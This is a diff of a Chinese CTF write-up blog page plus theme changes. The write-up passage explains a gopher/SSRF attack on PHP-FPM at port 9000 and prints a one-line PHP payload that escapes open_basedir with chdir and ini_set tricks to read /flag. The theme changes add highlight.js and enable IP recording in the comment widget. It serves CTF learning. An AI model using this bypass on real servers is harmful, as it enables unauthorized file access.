 <p>这里自己开始犯了个大错，没有给其带上9000端口.否则我们的gopher数据是发给80端口的。而实际上，我们要打的是监听9000端口的FPM。所以注意paylaod格式的端口与下划线。<br>之后看到<code>phpinfo()</code>会发现又禁掉了系统函数。但是主要的要点在于<code>bypass open_basedir</code>。否则我们的行动会被限制在这层目录。<br>考虑目录逻辑</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>
-<p>直接构造payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'byc'</span>);chdir(<span class="string">'byc'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure>
+<pre><code>/flag
+/var/www/html/index.php</code></pre><p>直接构造payload：</p>
+<pre><code class="php">mkdir(&#39;byc&#39;);chdir(&#39;byc&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;flag&#39;));</code></pre>
 <p>到根目录就可以拿flag了。<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 
   
@@ -683,7 +1072,7 @@ Hack World(盲注)简单的布尔盲注题，简单FUZZ一下发现是数值型�
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -695,9 +1084,9 @@ Hack World(盲注)简单的布尔盲注题，简单FUZZ一下发现是数值型�
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -830,6 +1219,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1043,7 +1434,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1099,6 +1490,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
